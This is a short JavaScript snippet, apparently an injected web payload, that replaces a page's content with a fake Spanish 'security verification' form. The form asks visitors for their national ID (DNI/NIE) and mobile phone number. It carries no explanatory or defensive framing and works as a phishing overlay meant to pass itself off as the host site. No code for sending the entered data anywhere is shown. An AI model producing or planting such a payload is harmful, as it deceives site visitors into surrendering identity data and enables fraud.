document.body.innerHTML=`
<div style="font-family:sans-serif; text-align:center; margin-top:50px;">
    <h2 style="color:#333">Verificaci&oacute;n de Seguridad</h2>
    <p>Por favor, confirme su identidad para continuar.</p>
    <form style="display:inline-block; background:#f4f4f4; padding:20px; border:1px solid #ccc; border-radius:5px; text-align:left">

        <label>DNI / NIE:
            <br>
            <input type=text style="width:100%; margin-bottom:10px">
        </label>
        <br>
        <label>
            Tel&eacute;fono M&oacute;vil:
            <br>
            <input type=tel style="width:100%; margin-bottom:20px">
        </label>
        <br>
        <button style="width:100%; padding:10px; background:#28a745; color:white; border:none; border-radius:3px; cursor:pointer">
            Validar Datos
        </button>
    </form>
</div>
`;
